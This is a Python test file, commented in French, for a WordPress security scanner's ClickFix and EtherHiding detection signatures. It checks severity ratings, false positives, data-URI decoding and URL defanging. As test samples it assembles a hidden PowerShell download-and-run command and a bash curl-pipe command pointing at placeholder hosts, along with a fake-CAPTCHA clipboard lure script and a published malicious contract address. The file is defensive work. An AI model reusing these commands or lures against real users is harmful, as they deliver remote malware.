"""Signatures ClickFix et EtherHiding (scanner/injection_signatures.py).

Les échantillons sont assemblés à l'exécution, morceau par morceau : aucun
fichier du dépôt ne contient un leurre complet qu'un antivirus confondrait
avec un vrai.
"""
import base64

import pytest
import yaml

from wp_security_forsure.scanner import injection_signatures as sig

PS = "power" + "shell"
IEX = "i" + "ex"
IRM = "i" + "rm"
CMD = f'{PS} -w h -c "{IEX}({IRM} https://exemple.invalid/a)"'
CLIP = "navigator.clipboard." + "writeText"
IOC = "0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff"


def rules(text):
    return {h.rule: h for h in sig.scan_script(text)}


def test_signature_file_loads_with_sources():
    s = sig.load_signatures()
    assert s.version == 1
    assert len(s.contracts) == 6
    raw = yaml.safe_load(sig.SIGNATURES_PATH.read_text(encoding="utf-8"))
    for entry in raw["etherhiding"]["contracts"] + raw["campaign_markers"]:
        assert entry["source"].startswith("https://"), entry
    assert raw["clickfix"]["source"]


def test_invalid_pattern_is_rejected():
    raw = yaml.safe_load(sig.SIGNATURES_PATH.read_text(encoding="utf-8"))
    raw["clickfix"]["lure_terms"].append("(")
    with pytest.raises(ValueError):
        sig.parse_signatures(raw)


def test_full_clickfix_script_is_critical():
    script = (f"btn.onclick=()=>{{{CLIP}('{CMD}');"
              "msg.innerText='Press Windows + R, then Ctrl + V';}")
    hit = rules(script)["clickfix_full"]
    assert hit.severity == "CRITICAL"
    assert hit.confidence == "potential"
    assert "hxxps://" in hit.excerpt and "https://" not in hit.excerpt


def test_keystroke_and_fake_captcha_terms_are_high():
    hit = rules("el.innerHTML='Verify you are human. Press Win + R then CTRL+V';"
                "title='reCAPTCHA Verification ID: 4821';")["clickfix_lure"]
    assert hit.severity == "HIGH"


def test_language_independent_shortcut():
    # Instructions traduites : seul le raccourci compte.
    assert rules("t='Appuyez sur ⊞ Win + R puis Strg + V'; c='captcha';")


def test_syntax_highlighter_with_copy_button_is_not_critical():
    """Grammaire PowerShell + bouton « copier » : pas de raccourci ni de faux
    CAPTCHA, donc au plus HIGH (et pas le constat complet)."""
    found = rules(f"Prism.languages.{PS}={{keyword:/Invoke-WebRequest/}};"
                  f"copy.onclick=()=>{CLIP}(code.textContent);")
    assert "clickfix_full" not in found


def test_recaptcha_contact_form_is_not_clickfix():
    assert rules("grecaptcha.ready(function(){grecaptcha.execute('site-key')});"
                 "var captcha=document.querySelector('.g-recaptcha');") == {}


def test_published_contract_is_critical_and_confirmed():
    hit = rules(f"const c='{IOC.lower()}';")["etherhiding_contract"]
    assert hit.severity == "CRITICAL" and hit.confidence == "confirmed"
    assert "ClearFake" in hit.label


def test_rpc_call_to_known_node_is_high():
    script = ("fetch('https://bsc-testnet-rpc.publicnode.com/',{method:'POST',"
              "body:JSON.stringify({\"jsonrpc\":\"2.0\",\"method\":\"eth_call\"})})")
    assert rules(script)["etherhiding_rpc"].severity == "HIGH"


def test_web3_client_with_contract_address_is_high():
    script = ("const w=new Web3('https://bsc-dataseed.binance.org/');"
              "new w.eth.Contract(abi,'0x" + "ab" * 20 + "')")
    assert "etherhiding_rpc" in rules(script)


def test_loader_chain_atob_inflate_eval():
    script = "eval(pako.ungzip(atob(p),{to:'string'}))"
    assert rules(script)["loader_chain"].severity == "HIGH"


def test_campaign_markers():
    assert "rapid7_ajjs" in rules("u='/wp-admin/admin-ajax.php?action=ajjs_run'")
    assert "unc5142_log" in rules("console.log('Road unavaible:')")


def test_unc5142_selector():
    assert "etherhiding_selector" in rules("d='0x9f7a7126'+x")


def test_library_urls_are_judged_by_presence():
    urls = ["https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js",
            "https://cdnjs.cloudflare.com/ajax/libs/pako/2.0.4/pako.min.js",
            "https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"]
    assert sig.library_ids(urls) == ["web3", "pako", "crypto_js"]
    assert sig.library_hits(urls)[0].rule == "library_triple"
    assert sig.library_hits(urls[:1])[0].severity == "MEDIUM"
    assert sig.is_library_url(urls[0])
    assert not sig.is_library_url("https://cible.test/wp-content/themes/t/main.js")


def test_rpc_host_ids():
    assert sig.rpc_host_id("bsc-dataseed1.binance.org") == "bsc_dataseed"
    assert sig.rpc_host_id("bsc-testnet-rpc.publicnode.com") == "publicnode_rpc"
    assert sig.rpc_host_id("api.ethplorer.io") == "explorer_api"
    assert sig.rpc_host_id("binance.org.exemple.fr") is None
    assert sig.rpc_host_id("cible.test") is None


def test_data_script_is_decoded_without_running():
    payload = f"{CLIP}('x');document.title='Verify you are human, Win + R'"
    src = "data:text/javascript;base64," + base64.b64encode(payload.encode()).decode()
    assert sig.is_data_script(src)
    assert sig.decode_data_script(src) == payload
    assert sig.decode_data_script("data:text/javascript,alert%281%29") == "alert(1)"
    assert sig.decode_data_script("https://cible.test/a.js") is None


def test_command_matches_on_clipboard_content():
    assert "windows_binary" in sig.command_matches(CMD)
    assert "unix_pipe" in sig.command_matches(
        "/bin/bash -c \"$(curl -fsSL https://exemple.invalid/x)\"")
    assert sig.command_matches("CODE-PROMO-2026") == []


def test_defang():
    assert sig.defang("voir https://a.example et http://b") == "voir hxxps://a.example et hxxp://b"
